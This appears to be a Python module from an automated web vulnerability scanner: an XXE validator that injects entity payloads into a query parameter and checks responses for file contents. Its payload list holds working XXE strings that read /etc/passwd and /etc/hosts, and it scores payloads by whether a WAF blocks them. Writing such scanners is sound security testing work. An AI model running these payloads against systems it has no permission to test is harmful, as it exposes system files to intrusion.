"""XXE validator (error-based default).

This validator uses DOCTYPE/entity payloads intended to trigger XML parser
errors or reflect trace information. It avoids making outbound network
interactions; detection is based on error messages and reflected entity
contents. Confirmed discoveries are those where known file markers (e.g.
``root:``) appear in responses.
"""
from __future__ import annotations

import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

import aiohttp

from core.adaptive_exploit_engine import AdaptiveExploitEngine, compute_reward
from .registry import register
from core.local_payload_engine import suggest_payloads

PAYLOADS = [
    "<!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root>",
    "<!DOCTYPE a [<!ENTITY % remote SYSTEM 'file:///etc/hosts'>%remote;]><a/>",
    "<!DOCTYPE t [<!ELEMENT t ANY ><!ENTITY e 'INJECT'>]><t>&e;</t>",
]

ERROR_KEYWORDS = ("xml", "doctype", "entity", "parser", "xmlexception", "parsing error")


async def _fetch(session: aiohttp.ClientSession, url: str) -> tuple[float, int, str]:
    start = time.monotonic()
    try:
        async with session.get(url, timeout=20) as r:
            body = await r.text(errors="ignore")
            return time.monotonic() - start, r.status, body
    except Exception:
        return 999.0, 0, ""


@register("xxe")
async def validate_xxe(url: str, param: str, timeout: int = 20) -> dict | None:
    parsed = urlparse(url)
    qs = parse_qs(parsed.query)
    _engine = AdaptiveExploitEngine()

    qs[param] = ["test"]
    baseline_url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))

    async with aiohttp.ClientSession() as session:
        baseline_time, _, baseline_body = await _fetch(session, baseline_url)

        payloads = suggest_payloads("xxe", n=12) or PAYLOADS
        for payload in payloads:
            qs[param] = [payload]
            test_url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
            response_time, status_code, body = await _fetch(session, test_url)
            waf = "blocked" if "blocked" in body.lower() else "unknown"

            lowered = body.lower()
            # Confirm if common file markers appear
            if "root:" in lowered or "127.0.0.1" in lowered:
                _engine.record_result(payload, "xxe", reward=1.0, waf=waf, tech=[])
                return {
                    "validated": True,
                    "type": "XXE",
                    "url": test_url,
                    "param": param,
                    "payload": payload,
                    "evidence": "Local file content reflected in response",
                }

            error_signal = any(k in lowered for k in ERROR_KEYWORDS)

            reward = 0.0 if waf == "blocked" else compute_reward(
                validated=False,
                response_time=response_time,
                baseline_time=baseline_time,
                response_body=body,
                baseline_body=baseline_body,
                status_code=status_code,
                waf_blocked=False,
                payload=payload,
            )

            if error_signal:
                reward = max(reward, 0.2)

            _engine.record_result(payload, "xxe", reward=reward, waf=waf, tech=[])

    return None
